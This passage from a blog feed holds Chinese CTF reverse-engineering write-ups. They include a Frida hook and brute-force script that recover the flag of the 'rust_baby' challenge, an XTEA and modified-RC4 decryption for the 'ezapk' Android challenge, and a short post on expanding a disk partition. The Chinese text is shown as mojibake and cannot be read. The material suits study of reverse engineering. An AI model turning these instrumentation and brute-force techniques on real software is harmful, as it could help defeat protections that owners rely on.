class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">1</span>, <span class="hljs-number">3</span>):<br>        processed_group1 = group[(j + <span class="hljs-number">1</span>) * <span class="hljs-number">2</span>] - j<br>        processed_group2 = group[(j + <span class="hljs-number">1</span>) * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] - j<br>        processed_bytes.append(processed_group1)<br>        processed_bytes.append(processed_group2)<br><br>processed_bytes = <span class="hljs-built_in">bytes</span>(processed_bytes)<br>flag = processed_bytes.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># flag&#123;6e2480b3-4f02-4cf1-9bc0-123b75f9a922&#125;EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE</span><br></code></pre></td></tr></table></figure><h3 id="æ³•2-2"><a href="#æ³•2-2" class="headerlink" title="æ³•2"></a>æ³•2</h3><p>ç”¨fridaæ’æ¡©çˆ†ç ´</p><p>cmpçš„å‡½æ•°</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719297305195-f1df5a26-37bb-4ff8-a3d0-7d0ae3278a31.png" class="" title="img"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> number = <span class="hljs-number">0</span><br><span class="hljs-comment">// frida -l .\hook.js -n rust_baby.exe </span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)<br>&#123;<br>  <span class="hljs-comment">// å¯»æ‰¾â€œrust_baby.exeâ€çš„åŸºç¡€åœ°å€</span><br>  <span class="hljs-keyword">var</span> base =  <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findBaseAddress</span>(<span class="hljs-string">&quot;rust_baby.exe&quot;</span>)<br><br>  <span class="hljs-keyword">if</span>(base)&#123;<br>    <span class="hljs-comment">// åœ¨æ‰¾åˆ°çš„åŸºç¡€åœ°å€ä¸Šæ·»åŠ æ‹¦æˆªå™¨ï¼Œæ‹¦æˆªæŒ‡å®šå‡½æ•°</span><br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(base.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x3EA8</span>), &#123;  <span class="hljs-comment">//åºå·åŠ 1çš„ä½ç½®</span><br>      <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br>        <span class="hljs-comment">// console.log(&quot;æˆåŠŸï¼&quot;);</span><br>        <span class="hljs-comment">// å½“å‡½æ•°è¢«è°ƒç”¨æ—¶æ‰§è¡Œçš„é€»è¾‘ï¼Œè¿™é‡Œå¢åŠ äº†å…¨å±€å˜é‡numberçš„å€¼å¹¶å‘é€</span><br>        number += <span class="hljs-number">1</span>;<br>        <span class="hljs-comment">// å‘é€æ•°æ®ï¼Œè¿™é‡Œç»™ python è„šæœ¬å‘é€ï¼Œå¦‚æœæ˜¯å‘½ä»¤è¡Œï¼Œä¼šæœ‰å‘é€çš„å›æ˜¾</span><br>        <span class="hljs-title function_">send</span>(number); <br>        <span class="hljs-comment">// å®ç°å»¶è¿Ÿï¼Œå»¶è¿Ÿæ—¶é—´å•ä½ä¸ºæ¯«ç§’ï¼Œå»¶è¿Ÿ 4 æ¯«ç§’</span><br>        <span class="hljs-keyword">var</span> delay = <span class="hljs-number">0x4</span>;<br>        <span class="hljs-keyword">var</span> start = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>();<br>        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>() &lt; start + delay);<br>        <span class="hljs-comment">// console.log(&quot;Delay complete.&quot;);</span><br>      &#125;<br>    &#125;);<br>  &#125;<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719297459552-c95a8164-875e-46b4-996b-ba8b82e90c6d.png" class="" title="img"><p>å¯ä»¥é‡‡å–ä¸€ç‚¹ç‚¹å¢åŠ çš„æ–¹å¼ï¼Œæ¯æ¬¡çˆ†2å­—èŠ‚ç„¶åæŠ¥é”™</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719298167708-a1f3ff89-bbf8-4c71-8aa5-99a43d95d45e.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> frida<br><br><span class="hljs-comment"># å®šä¹‰ç›®æ ‡æ–‡ä»¶åå’Œåˆå§‹å‘½ä»¤è¡Œå‚æ•°</span><br>filename = <span class="hljs-string">&quot;rust_baby.exe&quot;</span><br>cmd = [<span class="hljs-string">&#x27;./rust_baby.exe&#x27;</span>]<br><br><span class="hljs-comment"># ä»æ–‡ä»¶è¯»å–JavaScriptä»£ç </span><br>jscode = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Hook.js&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read().decode()<br><br><span class="hljs-comment"># è‡ªå®šä¹‰å¼‚å¸¸ç±»ï¼Œç”¨äºè¡¨ç¤ºæˆåŠŸæ‰¾åˆ°flag</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SUCCESSFLAG</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute</span>(<span class="hljs-params">F</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    é€šè¿‡Fridaå¯¹ç›®æ ‡ç¨‹åºè¿›è¡ŒåŠ¨æ€åˆ†æï¼Œä½¿ç”¨çˆ†ç ´æ–¹å¼è·å–æ­£ç¡®çš„flagã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°:</span><br><span class="hljs-string">    F: ç”¨äºä¼ é€’ç»™ç¨‹åºçš„è¾“å…¥ï¼Œç±»å‹ä¸ºbytesã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›å€¼:</span><br><span class="hljs-string">    result: è¿è¡Œç¨‹åºåçš„ç»“æœã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    æŠ›å‡º:</span><br><span class="hljs-string">    SUCCESSFLAG: å½“æ‰¾åˆ°æ­£ç¡®çš„flagæ—¶æŠ›å‡ºã€‚</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>        <span class="hljs-keyword">global</span> result<br>        <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>            result = message[<span class="hljs-string">&#x27;payload&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(message)<br>    <span class="hljs-comment"># åˆ›å»ºå­è¿›ç¨‹è¿è¡Œç›®æ ‡ç¨‹åºï¼Œå¹¶ä½¿ç”¨Fridaé™„åŠ åˆ°è¿›ç¨‹ä¸Š</span><br>    process = subprocess.Popen(cmd, stdin=subprocess.PIPE,<br>                               stdout=subprocess.PIPE,<br>                               stderr=subprocess.PIPE,<br>                               universal_newlines=<span class="hljs-literal">True</span>)<br>    session = frida.attach(filename)<br>    script = session.create_script(jscode)<br>    script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)<br>    script.load()<br><br>    <span class="hljs-comment"># å‘è¿›ç¨‹è¾“å…¥Fï¼Œå¹¶ç­‰å¾…è¿›ç¨‹ç»“æŸ</span><br>    process.stdin.write(F.decode())<br>    output, error = process.communicate()<br><br>    <span class="hljs-comment"># è‹¥è¾“å‡ºä¸­åŒ…å«&quot;correct flag&quot;ï¼Œåˆ™æ‰“å°å¹¶æŠ›å‡ºSUCCESSFLAGå¼‚å¸¸</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;correct flag&quot;</span> <span class="hljs-keyword">in</span> output:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ­£ç¡®çš„flagæ˜¯ï¼š&quot;</span>, F.decode())<br>        <span class="hljs-keyword">raise</span> SUCCESSFLAG(<span class="hljs-string">&quot;æŠ›å‡ºflagæˆåŠŸçš„å¼‚å¸¸ï¼ï¼ï¼&quot;</span>)<br>    process.terminate()<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bp</span>(<span class="hljs-params">startflag, old_number1, tag1</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    åŸºäºbruteå‡½æ•°çš„è¾…åŠ©çˆ†ç ´å‡½æ•°ï¼Œç”¨äºé€å­—ç¬¦çˆ†ç ´å¹¶å¤„ç†ç‰¹æ®Šæƒ…å†µã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°:</span><br><span class="hljs-string">    startflag: å½“å‰å·²çŸ¥çš„flagéƒ¨åˆ†ï¼Œåˆ—è¡¨å½¢å¼ã€‚</span><br><span class="hljs-string">    old_number1: ä¸Šä¸€æ¬¡çˆ†ç ´å¾—åˆ°çš„æ•°å­—ç»“æœã€‚</span><br><span class="hljs-string">    tag1: æ ‡å¿—ä½ï¼Œç”¨äºæ§åˆ¶çˆ†ç ´é€»è¾‘ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›å€¼:</span><br><span class="hljs-string">    startflag: æ›´æ–°åçš„flagéƒ¨åˆ†ã€‚</span><br><span class="hljs-string">    old_number1: æ›´æ–°åçš„æ•°å­—ç»“æœã€‚</span><br><span class="hljs-string">    tag1: æ›´æ–°åçš„æ ‡å¿—ä½ã€‚</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">global</span> temptag<br>    <span class="hljs-keyword">global</span> maxnumber<br>    idx = <span class="hljs-number">0</span><br>    temp = old_number1<br>    targetidx = -<span class="hljs-number">1</span><br>    table = <span class="hljs-string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#125;&quot;</span><br><br>    <span class="hljs-comment"># å¾ªç¯éå†å¯èƒ½çš„å­—ç¬¦ï¼Œå°è¯•çˆ†ç ´</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> table:<br>        startflag.append(<span class="hljs-built_in">ord</span>(ch))<br>        startflag.append(<span class="hljs-number">10</span>)<br>        my_bytearray = <span class="hljs-built_in">bytearray</span>(startflag)<br>        new_number = brute(my_bytearray)<br><br>        <span class="hljs-keyword">if</span>(new_number &gt; old_number1):<br>            <span class="hljs-keyword">if</span> tag1 == <span class="hljs-number">0</span>:<br>                old_number1 = new_number<br>                targetidx = idx<br>            <span class="hljs-keyword">if</span>(tag1 &gt; <span class="hljs-number">0</span>):<br>                tag1 -= <span class="hljs-number">1</span><br><br>        idx += <span class="hljs-number">1</span><br>        startflag = startflag[:-<span class="hljs-number">2</span>]<br><br>    <span class="hljs-comment"># è‹¥æœªæ‰¾åˆ°ç›®æ ‡å­—ç¬¦ï¼Œè¿›è¡Œå›æº¯å¤„ç†</span><br>    <span class="hljs-keyword">if</span>(targetidx == -<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;é”™è¯¯çš„ï¼š&quot;</span>)<br>        my_bytearray = <span class="hljs-built_in">bytearray</span>(startflag)<br>        <span class="hljs-built_in">print</span>(my_bytearray.decode())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å»é™¤é”™è¯¯å­—ç¬¦ï¼&quot;</span>)<br>        startflag = startflag[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;magic:&quot;</span>, temp-<span class="hljs-number">1</span>)<br>        temptag = temptag + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;magictag:&quot;</span>, temptag+<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> startflag, temp-<span class="hljs-number">1</span>, temptag<br><br>    <span class="hljs-comment"># æ‰¾åˆ°ç›®æ ‡å­—ç¬¦ï¼Œè¿›è¡Œç›¸åº”å¤„ç†</span><br>    bpret = table[targetidx:targetidx+<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç›®æ ‡æ•°æ®ï¼š&quot;</span>, bpret, <span class="hljs-built_in">ord</span>(bpret))<br>    startflag.append(<span class="hljs-built_in">ord</span>(bpret))<br>    my_bytearray = <span class="hljs-built_in">bytearray</span>(startflag)<br>    <span class="hljs-built_in">print</span>(my_bytearray.decode())<br>    <span class="hljs-keyword">return</span> startflag, old_number1, <span class="hljs-number">0</span><br><br><span class="hljs-comment"># åˆå§‹åŒ–å‚æ•°å¹¶å¼€å§‹çˆ†ç ´æµç¨‹</span><br><span class="hljs-comment"># startflag1 = [102, 108, 97, 103, 123]  # flagçš„æ ¼å¼æ˜¯å›ºå®šçš„ï¼Œå› æ­¤åˆå§‹å€¼å·²çŸ¥</span><br>startflag = [<span class="hljs-number">102</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">103</span>, <span class="hljs-number">123</span>, <span class="hljs-number">54</span>, <span class="hljs-number">101</span>, <span class="hljs-number">50</span>, <span class="hljs-number">52</span>, <span class="hljs-number">56</span>, <span class="hljs-number">48</span>, <span class="hljs-number">98</span>, <span class="hljs-number">51</span>, <span class="hljs-number">45</span>, <span class="hljs-number">52</span>, <span class="hljs-number">102</span>, <span class="hljs-number">48</span>, <span class="hljs-number">50</span>, <span class="hljs-number">45</span>, <span class="hljs-number">52</span>, <span class="hljs-number">99</span>, <span class="hljs-number">102</span>]<br>startflag.append(<span class="hljs-number">10</span>)<br>my_bytearray = <span class="hljs-built_in">bytearray</span>(startflag)<br><br>old_number = brute(my_bytearray)<br>startflag = startflag[:-<span class="hljs-number">1</span>]  <span class="hljs-comment"># å»é™¤å›è½¦</span><br>temptag = <span class="hljs-number">0</span><br>tag = <span class="hljs-number">0</span><br>idx = <span class="hljs-number">0</span><br>temp = <span class="hljs-built_in">len</span>(startflag)  <span class="hljs-comment"># åˆå§‹é•¿åº¦</span><br><br>cleartag = <span class="hljs-number">5</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    startflag, old_number, tag = bp(startflag, old_number, tag)  <span class="hljs-comment"># æ‰§è¡Œçˆ†ç ´é€»è¾‘</span><br><br>    <span class="hljs-keyword">if</span>(temp &lt; <span class="hljs-built_in">len</span>(startflag)):<br>        temp = <span class="hljs-built_in">len</span>(startflag)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-----&gt;&quot;</span>, temp-<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">if</span>((temp-cleartag)%<span class="hljs-number">3</span> == <span class="hljs-number">0</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;&gt;&gt;&gt;æ¸…ç†temptag&quot;</span>)<br>        temptag = <span class="hljs-number">0</span><br>        cleartag += <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cç›˜æ‰©å®¹</title>
    <link href="/2024/05/15/C%E7%9B%98%E6%89%A9%E5%AE%B9/"/>
    <url>/2024/05/15/C%E7%9B%98%E6%89%A9%E5%AE%B9/</url>
    
    <content type="html"><![CDATA[<p>è¿™ä¸¤å¤©åˆšä¹°äº†ç¡¬ç›˜ï¼Œæƒ³ç€ç»™Cç›˜æ‰©å®¹æ¥ç€ï¼Œ<del>ä¸ºä»¥åä¸‹2kåšå‡†å¤‡</del>ã€‚æ— æ³•ç›´æ¥ä»Eç›˜åˆ†é…è¿‡å»ï¼ˆä¸åŒç¡¬ç›˜ï¼‰ï¼Œé‚£å°±å…ˆæŠŠDç›˜çš„å¤åˆ¶åˆ°Eç›˜ï¼Œå†ä»Dç›˜åˆ†å†…å­˜åˆ°Cç›˜ã€‚</p><p>åŸºæœ¬æ•™ç¨‹ç½‘ä¸Šæœ‰ï¼Œå…ˆç”¨DiskGeniusæ‹†åˆ†åˆ†åŒºï¼ŒæŠŠç©ºä½™ç©ºé—´æ”¾åˆ°Cå’ŒDä¹‹é—´<img src="/2024/05/15/C%E7%9B%98%E6%89%A9%E5%AE%B9/image-20240515234259306.png" class="" title="image-20240515234259306"></p><p>ç›´æ¥æ‰©å®¹Cç›˜æŠ¥é”™bitmapä¸­æœ‰æ ‡è®°ä¸ºå·²ä½¿ç”¨çš„ç°‡ï¼Œæˆ‘è¿™é‡Œchkdskæ— æ•ˆï¼Œäºæ˜¯ç”¨è‡ªå¸¦çš„ç£ç›˜ç®¡ç†å™¨æ‰©å±•å·å°±å¯ä»¥å•¦</p><img src="/2024/05/15/C%E7%9B%98%E6%89%A9%E5%AE%B9/image-20240515234110804.png" class="" title="image-20240515234110804">]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>NSSRound22-Reverseä¸“é¡¹èµ›</title>
    <link href="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/"/>
    <url>/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>22è¿™ä¸ªæ•°å­—æˆ‘å¾ˆå–œæ¬¢ï¼Œå°±æ˜¯å‡ºçš„é¢˜ç›®éš¾äº†ç‚¹ğŸ˜¥</p><h2 id="ezapk-1"><a href="#ezapk-1" class="headerlink" title="ezapk-1"></a>ezapk-1</h2><p>javaå±‚æœ‰XTEA</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1712995414906-b14e000a-2d31-46cc-962d-4f9db223adf7.png" class="" title="img"><p>é­”æ”¹å¼‚æˆ–918,å¾—åˆ°usernameï¼Œè´Ÿæ•°ç”¨jebè½¬æˆ16è¿›åˆ¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">1</span>, <span class="hljs-number">2</span> &#125;;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">32</span>;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], i; <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9E3779B9</span>, sum = <span class="hljs-number">0x9E3779B9</span> * num;<br>    <span class="hljs-type">uint32_t</span> v2[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0x3D121D26</span>, <span class="hljs-number">0x5E6189F9</span> &#125;, v3[<span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0xC1FB278E</span>, <span class="hljs-number">0x3B494648</span> &#125;, v5[<span class="hljs-number">10</span>] = &#123; <span class="hljs-number">0x3c36eb49</span>, <span class="hljs-number">0x81acb0c0</span>, <span class="hljs-number">0xfac269ae</span>, <span class="hljs-number">0xca5bf9ec</span> &#125;;<br>    <span class="hljs-type">uint32_t</span> k[<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x5678abcd</span>, <span class="hljs-number">0x89ABCDEF</span>, <span class="hljs-number">0xCDEF1234</span> &#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-comment">// vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•°</span><br>    <span class="hljs-comment">// kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">8</span>; m += <span class="hljs-number">2</span>) &#123;<span class="hljs-comment">//flagä¸å…¨çš„è¯æœ‰å¯èƒ½æ˜¯10</span><br>        sum = <span class="hljs-number">0x9E3779B9</span> * num;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;                     <span class="hljs-comment">/* basic cycle start */</span><br>            v5[m + <span class="hljs-number">1</span>] -= (v5[m] &lt;&lt; <span class="hljs-number">4</span> ^ v5[m] &gt;&gt; <span class="hljs-number">5</span>)  + v5[m] ^ <span class="hljs-number">918</span> ^ k[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>] + sum;<br>            sum += <span class="hljs-number">0x61C88647</span>;<br>            v5[m] -= (v5[m + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span> ^ v5[m + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) + v5[m + <span class="hljs-number">1</span>] ^ <span class="hljs-number">918</span> ^ k[sum &amp; <span class="hljs-number">3</span>] + sum;<br>        &#125;                                              <span class="hljs-comment">/* end cycle */</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//NS5_R0Un6_z2_apK</span><br></code></pre></td></tr></table></figure><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1713004158231-726848ee-4198-4918-bce9-006e362ecff1.png" class="" title="img"><p>é­”æ”¹rc4,256å˜æˆ128</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1712995673545-44f7187b-f19b-40fe-a91c-821e37fb43dd.png" class="" title="img"><p>ä¸€å¼€å§‹ä»¥ä¸ºvalidatePasswordå‡½æ•°è¿˜æœ‰åŠ å¯†ï¼Œåæ¥æƒ³å¦‚æœæ˜¯è¿™æ ·çš„è¯javaå±‚åº”è¯¥æœ‰å¯†æ–‡ï¼Œå†å»çœ‹å‘ç°ä¸Šé¢å‡½æ•°åªæ˜¯ç¡®è®¤å¯†æ–‡ï¼Œè¿™æ ·çœ‹çš„è¯javaå±‚validatePassword(str, encryptWithRC4(str2, str))ä¸¤ä¸ªstrå«ä¹‰ä¸ä¸€æ ·</p><img src="/2024/04/28/NSSRound22Reverse%E4%B8%93%E9%A1%B9%E8%B5%9B/1713005527064-45e41f64-2346-4139-88db-0ff023ce32a1.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">128</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = j = <span 